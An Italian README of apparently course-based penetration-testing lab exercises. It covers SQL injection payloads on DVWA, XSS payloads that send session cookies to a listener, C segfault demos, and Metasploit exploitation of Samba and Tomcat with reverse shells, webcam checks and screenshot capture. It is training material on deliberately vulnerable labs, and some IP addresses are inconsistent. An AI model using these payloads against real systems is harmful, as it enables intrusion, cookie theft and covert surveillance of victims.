
# Guida all'uso e sicurezza: SQL Injection e XSS su DVWA

Questa repository contiene una guida dettagliata su come eseguire test di sicurezza attraverso vulnerabilità SQL Injection e XSS Persistenti sulla piattaforma DVWA (Damn Vulnerable Web Application).

---

## Giorno 1: SQL Injection su DVWA (Low e Medium)

### Obiettivo
Estrarre i dati sensibili dell'utente "Pablo" e decifrare la sua password MD5.

### Requisiti
- DVWA configurato e funzionante.
- Livelli di sicurezza in DVWA impostati su:
  - `Low` per la prima parte.
  - `Medium` per la seconda parte.

### Parte 1: Modalità Low

#### Passaggi
1. Vai alla pagina SQL Injection:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`
2. Inserisci il seguente payload nel campo "User ID":
   ```sql
   ' UNION SELECT user, password FROM dvwa.users WHERE user='Pablo' -- 
   ```
3. Risultati attesi:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`
4. Decifra la password hash:
   - L'hash `0d107d09f5bbe40cade3de5c71e9e9b7` corrisponde a `letmein`.
   - Utilizza uno strumento come [Crackstation](https://crackstation.net).

### Parte 2: Modalità Medium

#### Passaggi
1. Vai alla pagina SQL Injection:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`
2. Inserisci il seguente payload:
   ```sql
   0x27 UNION SELECT user, password FROM dvwa.users WHERE user=0x5061626c6f -- 
   ```
3. Risultati attesi:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`
4. Decifra l'hash come nella modalità Low.

---

## Giorno 2: Exploit XSS Persistente su DVWA (Low e Medium)

### Obiettivo
Simulare il furto di cookie di sessione sfruttando vulnerabilità XSS.

### Requisiti
- DVWA configurato e funzionante.
- Server di ascolto (Kali Linux) configurato sulla porta `4444`.

### Parte 1: Modalità Low

#### Passaggi
1. Configura il server di ascolto su Kali Linux:
   ```bash
   nc -lvnp 4444
   ```
2. Vai alla sezione XSS Persistente:
   - URL: `http://192.168.13.150/dvwa/vulnerabilities/xss_r/`
3. Inserisci il seguente payload:
   ```html
   <script>
     fetch('http://192.168.13.100:4444', { method: 'POST', body: document.cookie });
   </script>
   ```
4. Verifica i cookie ricevuti nel terminale di Kali Linux.

### Parte 2: Modalità Medium

#### Passaggi
1. Configura il server di ascolto su Kali Linux:
   ```bash
   nc -lvnp 4444
   ```
2. Vai alla sezione XSS Persistente:
   - URL: `http://192.168.13.150/dvwa/vulnerabilities/xss_r/`
3. Inserisci il seguente payload:
   ```html
   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.165:4444', {method: 'POST', body: document.cookie})">
   ```
4. Verifica i cookie ricevuti nel terminale di Kali Linux.

---

## Giorno 3: Simulazione di Segmentation Fault in C

### Obiettivo
Comprendere gli errori di memoria attraverso l'uso di segmentation fault.

### Programma Originale
1. Inserire 10 numeri interi in un array.
2. Ordinare i numeri in ordine crescente.
3. Visualizzare i numeri ordinati.

### Modifiche per il Segmentation Fault
- Accesso a puntatore nullo:
  ```c
  int *ptr = NULL;
  printf("Valore in *ptr: %d
", *ptr);
  ```
- Accesso a memoria non allocata:
  ```c
  ptr = (int *)0xDEADBEEF;
  printf("Valore in *ptr: %d
", *ptr);
  ```

### Risultati Attesi
- Modalità corretta: numeri ordinati correttamente.
- Modalità con errore: `Segmentation fault (core dumped)`.

---

## Conclusioni
Questa guida evidenzia l'importanza di implementare misure di sicurezza per proteggere le applicazioni da vulnerabilità come SQL Injection e XSS, oltre a migliorare la comprensione degli errori di memoria nei programmi C.

---

# Cybersecurity Training: Exploit and Vulnerability Analysis

## 🛡️ TRACCIA GIORNO 4: Sfruttamento di Vulnerabilità sulla Macchina Metasploitable

### 📋 Descrizione
Sulla macchina Metasploitable sono stati individuati diversi servizi in ascolto potenzialmente vulnerabili. Lo scopo di questa traccia è:

- 🖥️ Effettuare una scansione delle vulnerabilità con Nessus.
- ⚙️ Sfruttare la vulnerabilità del servizio Samba attivo sulla porta 445 TCP utilizzando Metasploit.
- ✅ Verificare l'accesso alla macchina compromessa eseguendo il comando `ifconfig` per ottenere l'indirizzo IP della macchina vittima.

### 🔧 Requisiti
- **IP Kali Linux**: 192.168.13.100
- **IP Metasploitable**: 192.168.13.150
- **Porta di ascolto del payload**: 5555
- **Tool utilizzati**: Nessus, MSFConsole (Metasploit)

### 🛠️ Passaggi Eseguiti

#### 1. 🔍 Scansione delle Vulnerabilità con Nessus

- **Avvio del servizio Nessus**:
  ```bash
  sudo systemctl start nessusd
  ```
- **Accesso all'interfaccia web**: `https://localhost:8834`
- **Creazione della scansione**:
  - Tipo: Basic Network Scan
  - Target: 192.168.50.3
- **Esecuzione dello scan**:
  - La scansione ha identificato una vulnerabilità critica sul servizio Samba in ascolto sulla porta 445 TCP.
- **Report allegato**:
  - I dettagli della scansione sono disponibili nel file `nessus_scan_report.html`.

#### 2. 💻 Attacco alla Macchina Metasploitable con Metasploit

- **Avvio di MSFConsole**:
  ```bash
  msfconsole
  ```
- **Ricerca dell'exploit appropriato**:
  ```bash
  search samba
  ```
  - Trovato: `exploit/multi/samba/usermap_script` (indice: 15).
- **Selezione dell'exploit**:
  ```bash
  use 15
  ```
- **Configurazione dei parametri dell'exploit**:
  ```bash
  set RHOSTS 192.168.13.150
  set RPORT 445
  set payload cmd/unix/reverse
  set LHOST 192.168.13.100
  set LPORT 5555
  ```
- **Esecuzione dell'exploit**:
  ```bash
  exploit
  ```
  - L'exploit ha avuto successo, fornendo una shell sulla macchina vittima.

#### 3. 📡 Verifica dell'Accesso alla Macchina Compromessa

- **Comando eseguito**:
  ```bash
  ifconfig
  ```
  - Risultato: Confermato l'indirizzo IP della macchina vittima: `192.168.50.3`.

### ✅ Conclusioni

- 🔎 Il Vulnerability Scanning ha evidenziato una vulnerabilità critica nel servizio Samba sulla porta 445 TCP.
- 💥 La vulnerabilità è stata sfruttata con successo utilizzando l'exploit `exploit/multi/samba/usermap_script` di Metasploit.
- 🖥️ È stato ottenuto accesso alla macchina compromessa e confermato l'indirizzo IP tramite il comando `ifconfig`.

---

## 🛡️ TRACCIA GIORNO 5: Exploit di Windows 10 con Metasploit

### 📋 Descrizione
Sulla macchina Windows 10 ci sono servizi che possono essere sfruttati per ottenere una sessione Meterpreter. L'obiettivo di questa traccia è:

1. Avviare i servizi richiesti sulla macchina target.
2. Effettuare una scansione delle vulnerabilità con Nessus.
3. Utilizzare Metasploit per exploitare il servizio Tomcat.
4. Confermare l'accesso alla macchina compromessa e raccogliere evidenze:
   - Verificare se è una macchina virtuale o fisica.
   - Recuperare le impostazioni di rete.
   - Controllare la presenza di webcam.
   - Catturare uno screenshot del desktop.

### 🔧 Requisiti
- **IP Kali Linux**: 192.168.13.100
- **IP Windows 10**: 192.168.13.151
- **Porta di ascolto (LPORT)**: 7777
- **Tool utilizzati**: Nessus, MSFConsole, PowerShell

### 🛠️ Passaggi Eseguiti

#### 1. Preparazione dei Servizi su Windows 10

- Accedere alla macchina target Windows 10 (`192.168.13.151`).
- Aprire Gestione Servizi (`services.msc`).
- Avviare il servizio Apache Tomcat (se non è già attivo).
- Verificare che il servizio sia in ascolto sulla porta 8080.

#### 2. Scansione delle Vulnerabilità con Nessus

- **Avviare il servizio Nessus su Kali Linux**:
  ```bash
  sudo systemctl start nessusd
  ```
- **Accedere all'interfaccia Nessus tramite il browser**: `https://localhost:8834`.
- **Creare una nuova scansione**:
  - Tipo: Basic Network Scan.
  - Target: 192.168.13.151.
- **Avviare la scansione**:
  - Identificare le vulnerabilità relative al servizio Tomcat.

#### 3. Exploit con Metasploit

##### 3.1 Configurazione dell'Exploit

- **Avviare Metasploit su Kali Linux**:
  ```bash
  msfconsole
  ```
- **Cercare gli exploit disponibili per Tomcat**:
  ```bash
  search tomcat
  ```
- **Selezionare l'exploit Tomcat Manager Upload**:
  ```bash
  use exploit/multi/http/tomcat_mgr_upload
  ```
- **Configurare i parametri dell'exploit**:
  ```bash
  set RHOSTS 192.168.13.151
  set RPORT 8080
  set HttpUsername admin
  set HttpPassword password
  set payload java/meterpreter/reverse_tcp
  set LHOST 192.168.13.151
  set LPORT 7777
  ```
- **Lanciare l'exploit**:
  ```bash
  exploit
  ```

#### 4. Raccolta delle Evidenze sulla Macchina Compromessa

##### 4.1 Verifica se la macchina è virtuale o fisica

- Eseguire il comando:
  ```bash
  sysinfo
  ```
- Per ulteriori verifiche, accedere alla shell:
  ```bash
  shell
  systeminfo
  ```

##### 4.2 Recupero delle impostazioni di rete

- Tornare a Meterpreter ed eseguire:
  ```bash
  ipconfig
  ```
- Annotare le configurazioni di rete.

##### 4.3 Controllo delle webcam

- Dalla shell di Windows, eseguire:
  ```bash
  wmic path win32_pnpentity get name | findstr /i "camera"
  ```

##### 4.4 Cattura di uno screenshot

- Aprire PowerShell dalla shell di Windows:
  ```powershell
  Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size); $bmp.Save('C:\Windows\Temp\screenshot.png'); $bmp.Dispose(); $graphics.Dispose()
  ```
- Tornare a Meterpreter e scaricare lo screenshot:
  ```bash
  download C:\Windows\Temp\screenshot.png
  ```

### ✅ Conclusioni

- Il servizio Apache Tomcat è stato sfruttato con successo per ottenere una sessione Meterpreter.
- Sono state raccolte evidenze riguardo alla macchina target:
  - Tipo di macchina (virtuale o fisica).
  - Configurazioni di rete.
  - Stato delle webcam.
  - Screenshot del desktop.

